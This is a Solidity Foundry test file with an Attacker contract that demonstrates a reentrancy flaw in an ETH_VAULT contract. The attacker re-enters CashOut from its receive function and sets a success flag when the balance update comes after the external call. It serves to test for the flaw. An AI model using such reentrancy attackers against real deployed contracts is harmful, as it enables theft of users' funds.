
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether, so we must deposit more than that.
        vm.assume(attackVal > 1 ether);
        // Cap the value to avoid unrealistic amounts or overflows in setup
        vm.assume(attackVal < 1000 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific pre-state needed other than deployment.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal/withdraw)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds to pass the balance check in CashOut later
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        // We expect the balance to be 'val' before the attack starts.
        initialSnapshot = val;

        // 3. Call the vulnerable function.
        victim.CashOut(val);

        // 4. Verify Success Conditions.
        // Verification happens inside receive() to prove the state was dirty during the call.
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            
            // Check if the balance in the vault is still equal to the initial deposit.
            // If the balance has NOT been deducted yet, it proves the state update happens after the external call.
            if (victim.balances(address(this)) == initialSnapshot) {
                exploitSucceeded = true;
            }

            // Re-enter the contract.
            // We call CashOut with 0 to prove we can re-enter and execute logic without 
            // triggering an underflow revert in Solidity 0.8.x when the stack unwinds.
            victim.CashOut(0);
        }
    }

    fallback() external payable {}
}
